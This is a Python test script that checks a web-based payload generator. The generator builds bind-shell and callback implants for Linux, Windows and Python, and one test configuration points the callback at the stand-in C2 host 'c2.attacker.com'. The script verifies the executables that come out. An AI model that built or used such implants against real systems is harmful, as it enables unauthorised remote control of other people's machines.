#!/usr/bin/env python3
"""
Test the payload generation directly without web server
"""

import os
import sys
import json

# Setup environment
sys.path.insert(0, '/workspace')
os.environ['PATH'] = os.environ.get('PATH', '') + ':/home/ubuntu/.local/bin'

def test_direct_generation():
    """Test payload generation directly"""
    
    print("="*70)
    print("DIRECT API TEST - SIMULATING WEB ENDPOINT")
    print("="*70)
    
    # Import what the web server would import
    from web_payload_generator import web_payload_gen
    
    # Test configurations matching what web UI would send
    test_cases = [
        {
            'name': 'Standard Linux Binary',
            'request': {
                'bind_host': '0.0.0.0',
                'bind_port': '4433',
                'listen_host': '',
                'listen_port': '',
                'enable_bind': True,
                'enable_listen': False,
                'platform': 'linux'
            }
        },
        {
            'name': 'Dual Mode Windows (falls back to Python)',
            'request': {
                'bind_host': '0.0.0.0',
                'bind_port': '8443',
                'listen_host': 'c2.attacker.com',
                'listen_port': '443',
                'enable_bind': True,
                'enable_listen': True,
                'platform': 'windows'
            }
        },
        {
            'name': 'Listen-only Python Script',
            'request': {
                'bind_host': '',
                'bind_port': '',
                'listen_host': '10.10.10.10',
                'listen_port': '1337',
                'enable_bind': False,
                'enable_listen': True,
                'platform': 'python'
            }
        }
    ]
    
    all_passed = True
    
    for i, test in enumerate(test_cases, 1):
        print(f"\n[TEST {i}] {test['name']}")
        print("-"*50)
        print(f"Request: {json.dumps(test['request'], indent=2)}")
        
        # Generate payload
        result = web_payload_gen.generate_payload(test['request'])
        
        if result['success']:
            print(f"\n✓ SUCCESS")
            print(f"  Path: {result['payload_path']}")
            print(f"  Type: {result['payload_type']}")
            print(f"  Platform: {result['platform']}")
            print(f"  Size: {result['size']:,} bytes")
            
            # Verify file exists and check type
            if os.path.exists(result['payload_path']):
                print(f"  ✓ File exists")
                
                # Check file signature
                with open(result['payload_path'], 'rb') as f:
                    header = f.read(20)
                    
                    if header[:4] == b'\x7fELF':
                        print(f"  ✓ Linux ELF executable confirmed")
                    elif header[:2] == b'MZ':
                        print(f"  ✓ Windows PE executable confirmed")
                    elif b'python' in header.lower() or b'from' in header:
                        print(f"  ✓ Python script confirmed")
                    else:
                        print(f"  ? File type: {header[:10]}")
                
                # Show what the download endpoint would return
                if result['filename'].endswith('.exe'):
                    mime = 'application/x-msdownload'
                elif result['filename'].endswith('.py'):
                    mime = 'text/x-python'
                else:
                    mime = 'application/octet-stream'
                
                print(f"  MIME Type: {mime}")
                print(f"  Download Name: {result['filename']}")
            else:
                print(f"  ✗ File does not exist!")
                all_passed = False
        else:
            print(f"\n✗ FAILED: {result['message']}")
            all_passed = False
    
    # Summary
    print("\n" + "="*70)
    print("TEST SUMMARY")
    print("="*70)
    
    if all_passed:
        print("✓ ALL TESTS PASSED")
        print("\nThe payload generation system is working correctly:")
        print("  • Linux binaries are generated as ELF executables (~13MB)")
        print("  • Windows requests fall back to Python scripts (no Wine)")
        print("  • Python scripts are generated when explicitly requested")
        print("  • All files are placed in correct directories")
        print("  • Proper metadata is returned for web interface")
    else:
        print("✗ SOME TESTS FAILED")
    
    return all_passed

if __name__ == "__main__":
    import time
    
    # Clean output
    start = time.time()
    success = test_direct_generation()
    elapsed = time.time() - start
    
    print(f"\nTotal time: {elapsed:.2f} seconds")
    
    # Show payload directory structure
    print("\n" + "="*70)
    print("GENERATED PAYLOAD STRUCTURE")
    print("="*70)
    
    payloads_dir = '/workspace/Payloads'
    if os.path.exists(payloads_dir):
        for config_dir in sorted(os.listdir(payloads_dir)):
            if config_dir.startswith('config'):
                config_path = os.path.join(payloads_dir, config_dir)
                print(f"\n{config_dir}/")
                
                for root, dirs, files in os.walk(config_path):
                    level = root.replace(config_path, '').count(os.sep)
                    indent = '  ' * (level + 1)
                    subdir = os.path.basename(root)
                    if subdir:
                        print(f"{indent}{subdir}/")
                    
                    subindent = '  ' * (level + 2)
                    for file in files:
                        file_path = os.path.join(root, file)
                        size = os.path.getsize(file_path)
                        
                        if size > 1024*1024:
                            size_str = f"{size/1024/1024:.1f}MB"
                        elif size > 1024:
                            size_str = f"{size/1024:.1f}KB"
                        else:
                            size_str = f"{size}B"
                        
                        print(f"{subindent}{file} ({size_str})")